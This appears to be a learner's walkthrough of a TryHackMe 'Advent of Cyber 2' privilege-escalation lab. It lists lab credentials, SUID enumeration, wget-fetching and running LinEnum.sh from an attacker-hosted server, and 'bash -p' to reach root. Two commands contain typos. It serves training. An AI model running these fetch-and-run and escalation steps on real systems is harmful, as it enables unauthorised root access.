# [Network] Privilege Escalation

IP: 10.10.128.128

Advent of Cyber 2:

Recap: Privilege Escalation again and cheatsheets (check them out!).

### What type of privilege escalation involves using a user account to execute commands as an administrator?
- `vertical`

### What is the name of the file that contains a list of users who are a part of the sudo group?
- `sudoers`

#### Use SSH to log in to the vulnerable machine like so: ssh cmnatic@10.10.128.128. Input the following password when prompted: `aoc2020`

### Enumerate the machine for executables that have had the SUID permission set. Look at the output and use a mixture of GTFObins and your researching skills to learn how to exploit this binary. You may find uploading some of the enumeration scripts that were used during today's task to be useful.
- Tried `find / -perm -u=s 0type f 2>/dev/null` and search the functions in there with GTFOBins but no luck.
- Trying to upload `LinEnum.sh`.
- `python3 -m http.server 8080`
- Then on the instance machine you can do `wget http://<your_kali_machine_ip>:8080/LinEnum.sh`
- `chmod+x LinEnum.sh`; `./LinEnum.sh`
- Again summary of runnable command.
- This time go to GTFOBins to find `bash`
- Use `bash -p`! Voila, do `whoami`, now you're root!
- `cat /root/flag.txt`


